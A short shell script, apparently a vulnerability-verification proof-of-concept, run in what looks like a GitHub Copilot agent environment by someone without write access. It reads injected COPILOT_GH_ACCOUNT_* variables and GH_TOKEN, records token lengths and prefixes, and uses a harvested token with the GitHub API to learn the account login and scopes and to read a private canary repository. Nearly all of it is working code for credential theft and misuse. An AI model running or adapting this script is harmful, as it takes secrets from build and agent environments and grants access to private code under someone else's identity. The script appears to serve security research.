#!/bin/sh
M=/var/tmp/vfy-bb6474a8-0910/marker-1115.txt
echo "OUTSIDER-NO-WRITE-ACCESS-RAN-VFY-1115" >> "$M"
echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$M"
echo "whoami_uid=$(id -u) user=$(id -un 2>/dev/null)" >> "$M"
env | grep '^COPILOT_GH_ACCOUNT_' | sed 's/=.*//' | sed 's/^/account_var_present=/' >> "$M"
echo "account_var_count=$(env | grep -c '^COPILOT_GH_ACCOUNT_')" >> "$M"
if [ -n "${GH_TOKEN:-}" ]; then echo "GH_TOKEN_set=yes len=${#GH_TOKEN} class=$(printf %s "$GH_TOKEN" | cut -c1-4)" >> "$M"; else echo "GH_TOKEN_set=no" >> "$M"; fi
if [ -n "${GH_HOST:-}" ]; then echo "GH_HOST_set=yes value=$GH_HOST" >> "$M"; else echo "GH_HOST_set=no" >> "$M"; fi
VN=$(env | grep '^COPILOT_GH_ACCOUNT_' | sed 's/=.*//' | head -1)
if [ -z "$VN" ]; then echo "injected_var_name=NONE_FOUND" >> "$M"; exit 0; fi
TK=$(eval echo "\$$VN")
echo "injected_var_name=$VN" >> "$M"
echo "injected_var_len=${#TK}" >> "$M"
echo "injected_var_class=$(printf %s "$TK" | cut -c1-4)" >> "$M"
W=$(curl -s -o /tmp/w1115 -w "%{http_code}" -H "Authorization: token $TK" -H "User-Agent: vfy" https://api.github.com/user)
echo "whoami_http=$W" >> "$M"
echo "whoami_login=$(sed -n 's/.*\"login\": *\"\([^\"]*\)\".*/\1/p' /tmp/w1115 | head -1)" >> "$M"
echo "scopes=$(curl -s -D - -o /dev/null -H "Authorization: token $TK" -H "User-Agent: vfy" https://api.github.com/user | grep -i "^x-oauth-scopes:" | tr -d "\r")" >> "$M"
P=$(curl -s -o /tmp/p1115 -w "%{http_code}" -H "Authorization: token $TK" -H "User-Agent: vfy" -H "Accept: application/vnd.github.raw" https://api.github.com/repos/mr-benty/zz-vfy-canary-0902/contents/CANARY.txt)
echo "privaterepo_http=$P" >> "$M"
echo "privaterepo_content=$(head -c 64 /tmp/p1115 | tr -d '\n')" >> "$M"
rm -f /tmp/w1115 /tmp/p1115
exit 0
